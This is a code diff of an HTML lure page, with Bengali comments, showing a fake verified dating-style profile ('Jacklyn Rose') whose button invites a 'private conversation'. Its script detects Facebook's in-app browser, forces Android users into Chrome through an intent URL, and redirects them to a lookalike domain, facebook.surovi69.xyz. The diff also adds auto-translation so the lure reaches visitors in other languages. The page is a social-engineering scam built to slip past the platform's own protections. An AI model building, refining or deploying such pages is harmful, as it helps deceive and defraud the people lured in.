@@ -21,8 +21,12 @@
             margin: 0; padding: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #f0f2f5;
-            display: flex; justify-content: center; align-items: center; height: 100vh;
+            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh;
         }
+        /* Google Translate Widget Hide */
+        .goog-te-banner-frame.skiptranslate { display: none !important; }
+        body { top: 0px !important; }
+
         .bridge-card {
             background: white; width: 95%; max-width: 400px;
             border-radius: 15px; overflow: hidden;
@@ -32,19 +36,35 @@
             width: 100%; height: 150px;
             background: url('https://i.ibb.co.com/HTXcyk1L/pic1.webp') center/cover;
         }
-        .profile-section { margin-top: -60px; padding: 20px; }
-        .img-container { position: relative; width: 120px; height: 120px; margin: 0 auto; }
+        .profile-section { margin-top: -65px; padding: 20px; position: relative; }
+        
+        .img-container { 
+            position: relative; 
+            width: 130px; 
+            height: 130px; 
+            margin: 0 auto; 
+        }
         .profile-img {
             width: 100%; height: 100%; border-radius: 50%;
             border: 4px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.1);
             object-fit: cover;
         }
+        /* অনলাইন ডট পজিশন ফিক্স */
         .online-dot {
-            height: 20px; width: 20px; background-color: #31a24c;
-            border: 3px solid white; border-radius: 50%;
-            position: absolute; bottom: 10px; right: 10px;
+            height: 22px; width: 22px; 
+            background-color: #31a24c;
+            border: 4px solid white; border-radius: 50%;
+            position: absolute; 
+            bottom: 12px; 
+            right: 12px;
+            z-index: 10;
         }
-        .name { font-size: 24px; font-weight: bold; color: #1c1e21; margin: 15px 0 5px; }
+        .name { 
+            font-size: 24px; font-weight: bold; color: #1c1e21; 
+            margin: 15px 0 5px; 
+            display: flex; align-items: center; justify-content: center; gap: 6px;
+        }
+        .verified-icon { color: #0084FF; font-size: 20px; }
         .bio { color: #65676b; font-size: 15px; margin-bottom: 25px; line-height: 1.5; }
         .main-btn {
             background-color: #0084FF; color: white; text-decoration: none;
@@ -53,6 +73,7 @@
             width: 85%; justify-content: center; font-size: 17px; 
             cursor: pointer; border: none;
         }
+        #google_translate_element { margin-top: 15px; }
     </style>
 </head>
 <body>
@@ -64,50 +85,56 @@
                 <img src="https://i.ibb.co.com/BHCXRznL/p1.webp" alt="Profile" class="profile-img">
                 <span class="online-dot"></span>
             </div>
-            <div class="name">Jacklyn Rose <i class="fas fa-check-circle" style="color: #0084FF; font-size: 18px;"></i></div>
-            <div class="bio">
-                Hey! Click below to start a private chat. This link will open directly in your Chrome browser for safety.
+            
+            <div class="name">
+                Jacklyn Rose 
+                <i class="fas fa-check-circle verified-icon" title="Verified Profile"></i>
             </div>
             
-            <!-- মেইন বাটন -->
+            <div class="bio">
+                Hey! I'm waiting for you. Click below to start our private conversation directly in Chrome.
+            </div>
+            
+            <!-- মেইন বাটন (অটো রিডাইরেক্ট অফ) -->
             <button class="main-btn" id="actionBtn">
                 <i class="fab fa-facebook-messenger"></i> Open in Chrome
             </button>
         </div>
     </div>
 
-    <script>
-        // আপনার গন্তব্য ইউআরএল
+    <!-- ভিজিটরের ভাষায় অটো ট্রান্সলেট করার জন্য এলিমেন্ট -->
+    <div id="google_translate_element"></div>
+
+    <script type="text/javascript">
+        // Google Translate Implementation
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'en',
+                layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+                autoDisplay: true
+            }, 'google_translate_element');
+        }
+
+        // রিডাইরেক্ট ফাংশন
         const targetUrl = "https://facebook.surovi69.xyz";
-        
-        // এটি অ্যান্ড্রয়েড ইউজারদের ফেসবুক অ্যাপ থেকে বের করে সরাসরি ক্রোম-এ নিয়ে যাবে
         const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";
 
         function openInExternalBrowser() {
-            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            const isFBApp = /FBAN|FBAV|Messenger/i.test(userAgent);
-
+            const isFBApp = /FBAN|FBAV|Messenger/i.test(navigator.userAgent);
             if (isFBApp) {
-                // ইউজার যদি ফেসবুক অ্যাপের ভেতরে থাকে, তবে এটি তাকে ক্রোম-এ ঠেলে দিবে
                 window.location.href = chromeIntent;
-                
-                // ফলব্যাক: যদি ইন্টেন্ট কাজ না করে, তবে সাধারণ রিডাইরেক্ট
-                setTimeout(() => {
-                    window.location.href = targetUrl;
-                }, 1500);
+                setTimeout(() => { window.location.href = targetUrl; }, 1500);
             } else {
-                // যদি অলরেডি ক্রোম বা অন্য ব্রাউজারে থাকে
                 window.location.href = targetUrl;
             }
         }
 
-        // বাটন ক্লিক করলেই কেবল এই ফাংশনটি কল হবে
+        // বাটন ক্লিক করলেই কেবল কাজ করবে
         document.getElementById('actionBtn').addEventListener('click', function(e) {
             e.preventDefault();
             openInExternalBrowser();
         });
-
-        // অটো-রিডাইরেক্ট কোডটি পুরোপুরি বাদ দেওয়া হয়েছে যাতে পেজ লোডে কিছু না ঘটে
     </script>
+    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </body>
 </html>
